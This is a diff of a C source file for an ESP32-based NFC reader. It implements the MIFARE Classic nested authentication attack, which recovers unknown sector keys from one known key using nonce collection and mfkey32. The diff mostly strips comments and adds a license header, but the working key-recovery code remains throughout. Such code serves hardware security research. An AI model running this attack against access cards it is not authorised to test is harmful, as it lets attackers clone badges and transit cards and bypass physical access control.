@@ -1,41 +1,23 @@
-/**
- * @file mf_nested.c
- * @brief Nested Authentication Attack for MIFARE Classic.
- *
- * Requires at least one known sector key. Collects multiple (nt, nr_enc, ar_enc)
- * triples via nested auth probes (AUTH sent inside an active Crypto1 session),
- * then uses mfkey32 to recover the target sector key offline.
- *
- * Protocol reference: proxmark3 / Flipper Zero nested implementation.
- *
- * ---- Nested auth wire protocol recap ----
- *
- *  Reader                              Card
- *    -- AUTH(known_sector) ----------->
- *    <-- nt_plain (cleartext) ---------
- *    -- {nr, ar} encrypted ----------->
- *    <-- at encrypted -----------------    <-- session is now active
- *
- *  (inside the active Crypto1 session)
- *    -- AUTH(target_block) encrypted -->   <-- 1-byte cmd + 1-byte block, encrypted
- *    <-- nt_target encrypted ----------    <-- 4 bytes, encrypted with CURRENT stream
- *    -- {nr_chosen, ar_computed} enc -->
- *    (do NOT wait for card's at; card may or may not respond, we only need nt)
- *
- *  The nt_target received on the wire is XOR'd with the running Crypto1 keystream.
- *  We decrypt it with the snapshot of the cipher state taken after the first auth.
- *
- * ---- mfkey32 input convention ----
- *
- *  uid     : UID as big-endian uint32
- *  nt      : plaintext card nonce (decrypted)
- *  nr_enc  : reader nonce as literally transmitted on wire (after XOR with keystream)
- *  ar_enc  : reader response as literally transmitted on wire
- *
- *  Two (nt, nr_enc, ar_enc) triples with the SAME target key are sufficient.
- */
+// Copyright (c) 2025 HIGH CODE LLC
+//
+// Licensed under the Apache License, Version 2.0 (the "License");
+// you may not use this file except in compliance with the License.
+// You may obtain a copy of the License at
+//
+//     http://www.apache.org/licenses/LICENSE-2.0
+//
+// Unless required by applicable law or agreed to in writing, software
+// distributed under the License is distributed on an "AS IS" BASIS,
+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+// See the License for the specific language governing permissions and
+// limitations under the License.
 
 #include "mf_nested.h"
+
+#include <string.h>
+
+#include "esp_log.h"
+
 #include "mf_classic.h"
 #include "crypto1.h"
 #include "mfkey.h"
@@ -48,18 +30,19 @@
 #include "st25r3916_reg.h"
 #include "st25r3916_cmd.h"
 
-#include "esp_log.h"
-#include <string.h>
+static const char *TAG = "NFC_MF_NESTED";
 
-#define TAG "mf_nested"
-
-/* --------------------------------------------------------------------------
- * Internal helpers
- * -------------------------------------------------------------------------- */
-
-/* Replicate the NO_TX_PAR / NO_RX_PAR bits from mifare.c */
 #define ISOA_NO_TX_PAR (1U << 7)
 #define ISOA_NO_RX_PAR (1U << 6)
+
+#define MF_SMALL_BLOCK_COUNT   4
+#define MF_4K_BIG_SECTOR_START 32
+#define MF_4K_BIG_BLOCK_COUNT  16
+#define MF_4K_BIG_BLOCK_BASE   128
+
+#define MF_NESTED_RX_TIMEOUT_MS 20
+#define MF_PRNG_AR_ADVANCE      64
+#define MF_NESTED_NR_BASE       0xDEAD0000U
 
 static inline void nested_bit_set(uint8_t *buf, size_t bitpos, uint8_t v) {
   if (v)
@@ -72,20 +55,17 @@ static inline uint8_t nested_bit_get(const uint8_t *buf, size_t bitpos) {
   return (uint8_t)((buf[bitpos >> 3] >> (bitpos & 7U)) & 1U);
 }
 
-/** First data block for a MIFARE Classic sector (works for 1K and 4K). */
 static uint8_t sector_to_first_block(uint8_t sector) {
-  if (sector < 32) {
-    return (uint8_t)(sector * 4U);
-  }
-  return (uint8_t)(128U + (sector - 32U) * 16U);
+  if (sector < MF_4K_BIG_SECTOR_START)
+    return (uint8_t)(sector * MF_SMALL_BLOCK_COUNT);
+  return (uint8_t)(MF_4K_BIG_BLOCK_BASE +
+                   (sector - MF_4K_BIG_SECTOR_START) * MF_4K_BIG_BLOCK_COUNT);
 }
 
-/** Pack 4 bytes (big-endian) into a uint32. */
 static inline uint32_t be4_to_u32(const uint8_t b[4]) {
   return ((uint32_t)b[0] << 24) | ((uint32_t)b[1] << 16) | ((uint32_t)b[2] << 8) | (uint32_t)b[3];
 }
 
-/** Unpack uint32 to 4 bytes big-endian. */
 static inline void u32_to_be4(uint32_t v, uint8_t b[4]) {
   b[0] = (uint8_t)(v >> 24);
   b[1] = (uint8_t)(v >> 16);
@@ -93,54 +73,20 @@ static inline void u32_to_be4(uint32_t v, uint8_t b[4]) {
   b[3] = (uint8_t)(v);
 }
 
-/* --------------------------------------------------------------------------
- * mf_nested_collect_sample
- *
- * Must be called immediately after a successful mf_classic_auth().
- * The Crypto1 cipher is active in the global s_crypto inside mifare.c.
- * We obtain a copy of that state through mf_classic_get_crypto_state().
- *
- * We then:
- *  1. Build the 2-byte nested AUTH command {key_type_byte, target_block}
- *     and encrypt it byte-by-byte through our copy of the Crypto1 state.
- *  2. Transmit the encrypted command (with manual parity, NO_TX_PAR mode).
- *  3. Receive 4 encrypted bytes (+ 4 parity bits) — the card's nested nt.
- *  4. Decrypt nt using the running Crypto1 state.
- *  5. Choose nr_chosen (caller-supplied), encrypt it, compute ar, encrypt it.
- *  6. Transmit {nr_enc, ar_enc} to complete the nested auth handshake so the
- *     card's PRNG advances (prevents lockout on some cards).
- *  7. Fill sample->nt, sample->nr_enc, sample->ar_enc.
- *
- * NOTE: mfkey32 wants the nr and ar values *as transmitted on the wire*
- *       (i.e., already XOR'd with keystream).  That is exactly what we record.
- * -------------------------------------------------------------------------- */
 hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
                                       const uint8_t uid[4],
                                       uint32_t nr_chosen,
                                       mf_nested_sample_t *sample) {
-  if (!uid || !sample)
+  if (uid == NULL || sample == NULL)
     return HB_NFC_ERR_PARAM;
 
-  /* ------------------------------------------------------------------ */
-  /* 1. Snapshot the live Crypto1 state from the ongoing session.        */
-  /* ------------------------------------------------------------------ */
   crypto1_state_t st;
   mf_classic_get_crypto_state(&st);
 
-  /* ------------------------------------------------------------------ */
-  /* 2. Build + encrypt the nested AUTH command (2 bytes).               */
-  /*    For Key A the command byte is 0x60, Key B is 0x61.               */
-  /*    Since we only need the nonce we always probe with Key A first;   */
-  /*    the caller can try both keys in mf_nested_attack().              */
-  /*                                                                     */
-  /*    Framing: each byte is followed by its parity bit (9 bits/byte),  */
-  /*    packed LSB-first into a byte buffer, mirroring mifare.c.         */
-  /* ------------------------------------------------------------------ */
   const uint8_t cmd_plain[2] = {(uint8_t)MF_KEY_A, target_block};
 
-  /* 2 bytes * 9 bits = 18 bits -> 3 bytes in the TX buffer */
   const size_t tx_bits = 2U * 9U;
-  const size_t tx_bytes = (tx_bits + 7U) / 8U; /* = 3 */
+  const size_t tx_bytes = (tx_bits + 7U) / 8U;
 
   uint8_t tx_buf[8] = {0};
   size_t bitpos = 0;
@@ -159,9 +105,6 @@ hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
     nested_bit_set(tx_buf, bitpos++, par);
   }
 
-  /* ------------------------------------------------------------------ */
-  /* 3. Send encrypted AUTH command (no CRC, manual parity via NO_TX_PAR)*/
-  /* ------------------------------------------------------------------ */
   uint8_t iso_reg = 0;
   hb_nfc_spi_reg_read(ST25R3916_REG_ISO14443A, &iso_reg);
   hb_nfc_spi_reg_write(ST25R3916_REG_ISO14443A,
@@ -178,15 +121,11 @@ hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
     return HB_NFC_ERR_TX_TIMEOUT;
   }
 
-  /* ------------------------------------------------------------------ */
-  /* 4. Receive encrypted nt from card: 4 bytes + 4 parity bits = 36 bits*/
-  /*    -> 5 bytes in the RX buffer.                                     */
-  /* ------------------------------------------------------------------ */
   const size_t rx_bits = 4U * 9U;
-  const size_t rx_bytes = (rx_bits + 7U) / 8U; /* = 5 */
+  const size_t rx_bytes = (rx_bits + 7U) / 8U;
 
   uint16_t count = 0;
-  (void)st25r3916_fifo_wait(rx_bytes, 20, &count);
+  (void)st25r3916_fifo_wait(rx_bytes, MF_NESTED_RX_TIMEOUT_MS, &count);
   if (count < rx_bytes) {
     hb_nfc_spi_reg_write(ST25R3916_REG_ISO14443A, iso_reg);
     ESP_LOGW(TAG,
@@ -199,9 +138,6 @@ hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
   uint8_t rx_buf[8] = {0};
   st25r3916_fifo_read(rx_buf, rx_bytes);
 
-  /* ------------------------------------------------------------------ */
-  /* 5. Decrypt nt: XOR each encrypted byte with keystream.             */
-  /* ------------------------------------------------------------------ */
   uint8_t nt_bytes[4] = {0};
   bitpos = 0;
   for (int i = 0; i < 4; i++) {
@@ -217,36 +153,21 @@ hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
   uint32_t nt_plain = be4_to_u32(nt_bytes);
   ESP_LOGI(TAG, "nested: block %u  nt=0x%08" PRIX32, target_block, nt_plain);
 
-  /* ------------------------------------------------------------------ */
-  /* 6. Encrypt nr_chosen and compute + encrypt ar.                     */
-  /*    We must send {nr_enc, ar_enc} to complete the handshake so the  */
-  /*    card's PRNG advances (avoids lockout on cards that track state). */
-  /*                                                                     */
-  /*    For mfkey32 we need the values *as transmitted on the wire*,    */
-  /*    so we record the encrypted versions.                             */
-  /* ------------------------------------------------------------------ */
-
-  /* --- Prime Crypto1 with nt_plain XOR uid (nested handshake phase) - */
-  /* The card's inner Crypto1 for the nested session starts from nt.    */
-  /* We mimic the same priming used in the normal auth path.            */
   uint32_t uid32 = be4_to_u32(uid);
   crypto1_word(&st, nt_plain ^ uid32, 0);
 
-  /* --- Encrypt nr_chosen ------------------------------------------- */
   uint8_t nr_plain_bytes[4];
   uint8_t nr_enc_bytes[4];
   u32_to_be4(nr_chosen, nr_plain_bytes);
 
-  /* 8 data bytes (nr + ar) * 9 bits = 72 bits -> 9 bytes */
   const size_t tx2_bits = 8U * 9U;
-  const size_t tx2_bytes = (tx2_bits + 7U) / 8U; /* = 9 */
+  const size_t tx2_bytes = (tx2_bits + 7U) / 8U;
   uint8_t tx2_buf[12] = {0};
   size_t bitpos2 = 0;
 
-  /* encrypt nr (4 bytes) */
   for (int i = 0; i < 4; i++) {
     uint8_t plain = nr_plain_bytes[i];
-    uint8_t ks = crypto1_byte(&st, plain, 0); /* feed plaintext nr */
+    uint8_t ks = crypto1_byte(&st, plain, 0);
     nr_enc_bytes[i] = plain ^ ks;
 
     for (int bit = 0; bit < 8; bit++) {
@@ -257,13 +178,11 @@ hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
     nested_bit_set(tx2_buf, bitpos2++, par);
   }
 
-  /* compute ar = prng_successor(nt_plain, 64) */
-  uint32_t ar_plain_word = crypto1_prng_successor(nt_plain, 64);
+  uint32_t ar_plain_word = crypto1_prng_successor(nt_plain, MF_PRNG_AR_ADVANCE);
   uint8_t ar_plain_bytes[4];
   uint8_t ar_enc_bytes[4];
   u32_to_be4(ar_plain_word, ar_plain_bytes);
 
-  /* encrypt ar (4 bytes, feeding 0 — free-running LFSR) */
   for (int i = 0; i < 4; i++) {
     uint8_t plain = ar_plain_bytes[i];
     uint8_t ks = crypto1_byte(&st, 0, 0);
@@ -277,25 +196,15 @@ hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
     nested_bit_set(tx2_buf, bitpos2++, par);
   }
 
-  /* ------------------------------------------------------------------ */
-  /* 7. Transmit {nr_enc, ar_enc} to close the nested handshake.        */
-  /*    We do not wait for the card's at response — we only needed nt.  */
-  /* ------------------------------------------------------------------ */
   st25r3916_fifo_clear();
   st25r3916_fifo_set_tx_bytes((uint16_t)(tx2_bits / 8U), (uint8_t)(tx2_bits % 8U));
   st25r3916_fifo_load(tx2_buf, tx2_bytes);
   hb_nfc_spi_direct_cmd(ST25R3916_CMD_TX_WO_CRC);
 
-  /* Wait for TX to finish; ignore RX response (at) */
   (void)st25r3916_irq_wait_txe();
 
   hb_nfc_spi_reg_write(ST25R3916_REG_ISO14443A, iso_reg);
 
-  /* ------------------------------------------------------------------ */
-  /* 8. Record the sample.                                               */
-  /*    nr_enc and ar_enc are the on-wire (encrypted) values as needed   */
-  /*    by mfkey32.                                                      */
-  /* ------------------------------------------------------------------ */
   sample->nt = nt_plain;
   sample->nr_enc = be4_to_u32(nr_enc_bytes);
   sample->ar_enc = be4_to_u32(ar_enc_bytes);
@@ -309,17 +218,6 @@ hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
   return HB_NFC_OK;
 }
 
-/* --------------------------------------------------------------------------
- * mf_nested_attack
- *
- * Full nested attack:
- *  1. Derive first blocks for source and target sectors.
- *  2. Collect MF_NESTED_SAMPLE_COUNT samples (each round: reselect, auth src,
- *     probe target).
- *  3. Try mfkey32 on consecutive sample pairs.
- *  4. For each candidate key64, try Key A then Key B by real auth.
- *  5. Return the verified key.
- * -------------------------------------------------------------------------- */
 hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t *card,
                               uint8_t src_sector,
                               const mf_classic_key_t *src_key,
@@ -327,7 +225,7 @@ hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t *card,
                               uint8_t target_sector,
                               mf_classic_key_t *found_key_out,
                               mf_key_type_t *found_key_type_out) {
-  if (!card || !src_key || !found_key_out || !found_key_type_out)
+  if (card == NULL || src_key == NULL || found_key_out == NULL || found_key_type_out == NULL)
     return HB_NFC_ERR_PARAM;
 
   uint8_t src_block = sector_to_first_block(src_sector);
@@ -340,15 +238,11 @@ hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t *card,
            target_sector,
            target_block);
 
-  /* ------------------------------------------------------------------ */
-  /* Collect samples.                                                    */
-  /* ------------------------------------------------------------------ */
   mf_nested_sample_t samples[MF_NESTED_SAMPLE_COUNT];
   int n_samples = 0;
 
   for (int attempt = 0; attempt < MF_NESTED_MAX_ATTEMPTS && n_samples < MF_NESTED_SAMPLE_COUNT;
        attempt++) {
-    /* Reset auth state and reselect the card. */
     mf_classic_reset_auth();
 
     hb_nfc_err_t sel_err = iso14443a_poller_reselect(card);
@@ -357,19 +251,13 @@ hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t *card,
       continue;
     }
 
-    /* Authenticate to the known source sector. */
     hb_nfc_err_t auth_err = mf_classic_auth(src_block, src_key_type, src_key, card->uid);
     if (auth_err != HB_NFC_OK) {
       ESP_LOGW(TAG, "nested: src auth failed on attempt %d (%d)", attempt, auth_err);
       continue;
     }
 
-    /*
-     * Choose a deterministic nr so that if we run the attack twice with
-     * the same uid+key pair the mfkey32 inputs are reproducible.
-     * Using a counter-based value as specified.
-     */
-    uint32_t nr_chosen = 0xDEAD0000U + (uint32_t)attempt;
+    uint32_t nr_chosen = MF_NESTED_NR_BASE + (uint32_t)attempt;
 
     hb_nfc_err_t sample_err =
         mf_nested_collect_sample(target_block, card->uid, nr_chosen, &samples[n_samples]);
@@ -388,9 +276,6 @@ hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t *card,
 
   ESP_LOGI(TAG, "nested: running mfkey32 on %d sample pairs", n_samples - 1);
 
-  /* ------------------------------------------------------------------ */
-  /* Run mfkey32 on consecutive pairs and verify each candidate.        */
-  /* ------------------------------------------------------------------ */
   uint32_t uid32 = ((uint32_t)card->uid[0] << 24) | ((uint32_t)card->uid[1] << 16) |
                    ((uint32_t)card->uid[2] << 8) | (uint32_t)card->uid[3];
 
@@ -412,7 +297,6 @@ hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t *card,
 
     ESP_LOGI(TAG, "nested: mfkey32 pair %d/%d: candidate 0x%012" PRIX64, i, i + 1, key64);
 
-    /* Convert key64 to mf_classic_key_t (big-endian, 6 bytes). */
     mf_classic_key_t k;
     uint64_t tmp = key64;
     for (int b = 5; b >= 0; b--) {
@@ -420,7 +304,6 @@ hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t *card,
       tmp >>= 8;
     }
 
-    /* Verify by real authentication — try Key A, then Key B. */
     mf_classic_reset_auth();
     if (iso14443a_poller_reselect(card) != HB_NFC_OK) {
       ESP_LOGW(TAG, "nested: reselect failed during verification");
